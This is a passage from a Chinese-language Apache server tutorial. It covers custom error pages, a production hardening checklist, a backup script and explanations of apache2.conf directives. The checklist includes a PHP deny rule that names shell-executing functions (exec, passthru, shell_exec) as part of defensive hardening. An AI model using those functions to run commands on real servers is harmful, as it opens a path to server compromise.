<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/errors</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建404页面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cat</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> &lt;&lt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 'EOF'</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tee</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/errors/404.html</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;!DOCTYPE html></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;html></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;head></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;title>404 - Page Not Found&lt;/title></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;style></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        body { font-family: Arial; text-align: center; padding: 50px; }</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">        h1 { font-size: 50px; }</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;/style></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/head></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;body></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;h1>404&lt;/h1></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;p>The page you're looking for doesn't exist.&lt;/p></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    &lt;a href=&quot;/&quot;>Go Home&lt;/a></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/body></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&lt;/html></span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">EOF</span></span></code></pre></figure>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在虚拟主机配置中添加</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 400</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">400</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 401</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">401</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 403</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">403</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 404</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">404</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 500</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">500</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Alias</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /errors</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/errors</span></span></code></pre></figure>
<h2 id="十二安全加固清单">十二、安全加固清单<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十二安全加固清单" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="生产环境安全检查表">生产环境安全检查表<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#生产环境安全检查表" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 1. 更新系统和Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> update</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &amp;&amp; </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> upgrade</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 2. 最小化安装（仅安装需要的模块）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 检查已启用模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2dismod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> status</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> autoindex</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  # 禁用不需要的模块</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 3. 隐藏版本信息</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ServerTokens Prod</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ServerSignature Off</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 4. 禁用目录浏览</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Options -Indexes</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 5. 限制HTTP方法</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;LimitExcept GET POST></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#     Require all denied</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># &lt;/LimitExcept></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 6. 配置SSL/TLS</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用强加密套件和TLS 1.2+</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 7. 实施访问控制</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 使用IP白名单、认证等</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 8. 配置防火墙</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ufw</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> enable</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ufw</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> allow</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 80/tcp</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ufw</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> allow</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 443/tcp</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 9. 定期备份配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -czf</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache-config-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">date</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +%Y%m%d</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 10. 监控日志</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 设置日志监控和告警</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 11. 使用ModSecurity</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装并配置WAF</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 12. 限制上传文件大小</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># LimitRequestBody 10485760</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 13. 配置适当的文件权限</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> find</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> f</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -exec</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 644</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> {}</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> find</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> d</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -exec</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chmod</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 755</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> {}</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 14. 禁用不安全的PHP函数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># disable_functions = exec,passthru,shell_exec...</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 15. 定期安全审计</span></span></code></pre></figure>
<h2 id="十三备份与恢复">十三、备份与恢复<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十三备份与恢复" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="备份脚本">备份脚本<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#备份脚本" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#!/bin/bash</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Apache完整备份脚本</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">BACKUP_DIR</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;/backup/apache&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">DATE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">date</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +%Y%m%d-%H%M%S</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">BACKUP_FILE</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;apache-backup-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建备份目录</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 备份配置文件</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Backing up Apache configuration...&quot;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -czf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/config-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 备份网站文件</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Backing up web files...&quot;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -czf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/www-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 备份日志（可选）</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Backing up logs...&quot;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -czf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/logs-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$DATE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.tar.gz</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/log/apache2/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建完整备份</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> tar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -czf</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$BACKUP_FILE </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">\</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    /etc/apache2/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    /var/www/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">    /etc/ssl/</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 删除30天前的备份</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">find</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $BACKUP_DIR </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;*.tar.gz&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -mtime</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +30</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -delete</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;Backup completed: </span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$BACKUP_DIR</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$BACKUP_FILE</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;</span></span></code></pre></figure>
<h2 id="十四配置文件详细讲解">十四、配置文件详细讲解<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#十四配置文件详细讲解" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-apache2conf---主配置文件">1. apache2.conf - 主配置文件<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-apache2conf---主配置文件" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p>Apache的核心配置文件，控制全局行为和默认设置。</p>
<h5 id="11-基本服务器配置">1.1 基本服务器配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11-基本服务器配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 服务器根目录</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">ServerRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;/etc/apache2&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 互斥锁文件配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Mutex</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> file:${APACHE_LOCK_DIR} default</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># PID文件位置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">PidFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_PID_FILE}</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 请求超时时间（秒）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Timeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 300</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保持连接设置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAlive</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                    # 启用持久连接</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">MaxKeepAliveRequests</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        # 每个连接的最大请求数</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">              # 持久连接超时时间（秒）</span></span></code></pre></figure>
<h5 id="12-用户和组配置">1.2 用户和组配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12-用户和组配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Apache运行用户和组</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">User</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_RUN_USER}         # 通常为 www-data</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Group</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_RUN_GROUP}       # 通常为 www-data</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 实际值在 /etc/apache2/envvars 中定义</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># export APACHE_RUN_USER=www-data</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># export APACHE_RUN_GROUP=www-data</span></span></code></pre></figure>
<h5 id="13-主机名查找">1.3 主机名查找<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#13-主机名查找" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁用主机名查找（提高性能）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HostnameLookups</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Off</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 如果启用，Apache会对每个连接进行反向DNS查询</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 这会显著降低性能，除非日志分析确实需要主机名</span></span></code></pre></figure>
